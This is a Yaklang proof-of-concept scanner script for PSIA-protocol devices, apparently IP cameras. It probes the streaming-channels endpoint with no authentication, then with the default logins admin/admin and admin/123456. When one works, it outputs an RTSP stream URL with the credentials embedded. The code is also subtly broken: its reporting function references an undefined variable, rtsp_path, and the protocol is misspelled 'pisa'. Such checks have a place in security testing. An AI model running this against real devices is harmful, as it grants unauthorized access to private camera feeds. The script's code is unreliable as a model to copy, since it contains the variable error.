##server:psia
##type:poc
##params:root_url
##name:psia_weak_password_poc
##severity:high
##out_put:psia_weak_username,psia_weak_password,psia_rtsp_path

loglevel(`info`)
yakit.AutoInitYakit()
username_list = ["admin", ]

password_list = ["admin", "123456"]


poc1=func(addr){
    isTls=str.IsTLSServer(addr)
    packet=`GET /PSIA/Streaming/channels HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate`

    rsp,req,err=poc.HTTP(
        packet, 
        poc.https(isTls),
        poc.params({"addr":addr}),
        // poc.proxy("http://127.0.0.1:8083"),
        )
    if err != nil {
        die(err)
    }
    path="rtsp://"+addr+":554/PSIA/Streaming/channels/1"
    if str.MatchAllOfSubString(rsp, "StreamingChannelList")  {
        res_output(path,"","")
    }

}


poc2=func(addr,username,password){
    isTls=str.IsTLSServer(addr)
    packet=`GET /PSIA/Streaming/channels HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Authorization: Basic {{base64({{params(username)}}:{{params(password)}})}}`

    rsp,req,err=poc.HTTP(
        packet, 
        poc.https(isTls),
        poc.params({"addr":addr,"username":username,"password":password}),
        // poc.proxy("http://127.0.0.1:8083"),
        )
    if err != nil {
        die(err)
    }

    path="rtsp://"+username+":"+password+"@"+addr+":554/PSIA/Streaming/channels/1"
    if str.MatchAllOfSubString(rsp, "StreamingChannelList")  {
        res_output(path,username,password)
    }    

}



res_output=func(psia_rtsp_path,username,password){
    risk.NewRisk(
        root_url, 
        risk.severity("high"), 
        risk.title(f"FOUND ${root_url} 存在pisa协议弱口令漏洞"), 
        risk.titleVerbose("pisa协议弱口令漏洞"), 
        risk.type("身份伪造"), 
        risk.typeVerbose("配置错误"), 
        risk.details({
            "psia_rtsp_path": rtsp_path, 
            "psia_weak_username": username, 
            "psia_weak_password": password}), 
            )    

}



root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
log.info("尝试无认证登录")
poc1(addr)
log.info("尝试弱口令登录")
for username in username_list{
    for password in password_list{
        poc2(addr,username,password)
    }
}
